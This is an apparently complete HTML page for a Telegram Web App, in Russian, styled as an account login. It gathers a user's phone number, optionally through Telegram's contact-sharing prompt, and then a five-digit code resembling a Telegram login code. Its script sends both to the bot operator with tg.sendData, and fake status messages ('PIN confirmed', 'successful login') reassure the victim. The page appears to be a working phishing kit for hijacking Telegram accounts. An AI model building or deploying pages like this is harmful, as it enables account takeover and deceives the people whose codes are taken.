<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход в аккаунт</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body { background: #0e1621; color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .card { background: #17212b; border-radius: 20px; padding: 24px; width: 100%; max-width: 400px; }
        h1 { font-size: 24px; margin-bottom: 20px; }
        .input { width: 100%; padding: 16px; background: #0e1621; border: 1px solid #2b3b4c; border-radius: 12px; color: white; font-size: 16px; margin-bottom: 16px; }
        .btn { width: 100%; padding: 16px; background: #2b5278; border: none; border-radius: 12px; color: white; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 12px; }
        .btn:active { opacity: 0.8; }
        .code-inputs { display: flex; gap: 8px; justify-content: center; margin: 20px 0; }
        .code-digit { width: 50px; height: 60px; background: #0e1621; border: 2px solid #2b3b4c; border-radius: 12px; color: white; font-size: 24px; text-align: center; }
        .status { background: #0e1621; border-left: 4px solid #2b5278; padding: 12px; border-radius: 8px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <h1>🔐 Вход в аккаунт</h1>
        
        <div id="step1">
            <div class="status">✅ Пин-код 5482 подтверждён</div>
            <input type="tel" class="input" id="phone" placeholder="+7 900 123 45 67" value="+7">
            <button class="btn" onclick="sendPhone()">📱 Отправить код</button>
            <button class="btn" onclick="useMyNumber()">📞 Использовать мой номер</button>
        </div>
        
        <div id="step2" style="display:none;">
            <div class="status" id="codeStatus">✅ Код отправлен! Введи его:</div>
            <div class="code-inputs">
                <input class="code-digit" maxlength="1" onkeyup="moveToNext(this, 0)">
                <input class="code-digit" maxlength="1" onkeyup="moveToNext(this, 1)">
                <input class="code-digit" maxlength="1" onkeyup="moveToNext(this, 2)">
                <input class="code-digit" maxlength="1" onkeyup="moveToNext(this, 3)">
                <input class="code-digit" maxlength="1" onkeyup="moveToNext(this, 4)">
            </div>
            <button class="btn" onclick="verifyCode()">🔑 Подтвердить</button>
            <button class="btn" onclick="resendCode()">🔄 Отправить снова</button>
        </div>
        
        <div id="step3" style="display:none;">
            <div class="status" style="border-left-color: #4CAF50;">✅ Успешный вход!</div>
            <div id="accountInfo" style="margin-bottom: 20px;"></div>
            <button class="btn" onclick="closeApp()">✅ Готово</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        
        let currentStep = 1;
        let phoneNumber = '';
        let codeDigits = ['', '', '', '', ''];
        
        function sendPhone() {
            phoneNumber = document.getElementById('phone').value;
            tg.sendData(JSON.stringify({
                action: 'send_phone',
                phone: phoneNumber
            }));
            
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
        }
        
        function useMyNumber() {
            tg.requestContact((success, response) => {
                if (success) {
                    phoneNumber = response.contact.phone_number;
                    document.getElementById('phone').value = phoneNumber;
                    sendPhone();
                }
            });
        }
        
        function moveToNext(input, index) {
            codeDigits[index] = input.value;
            if (input.value && index < 4) {
                document.querySelectorAll('.code-digit')[index + 1].focus();
            }
        }
        
        function verifyCode() {
            const code = codeDigits.join('');
            tg.sendData(JSON.stringify({
                action: 'send_code',
                code: code
            }));
            
            document.getElementById('codeStatus').innerText = '⏳ Проверка кода...';
        }
        
        function resendCode() {
            tg.sendData(JSON.stringify({
                action: 'send_phone',
                phone: phoneNumber
            }));
        }
        
        function closeApp() {
            tg.close();
        }
    </script>
</body>
</html>
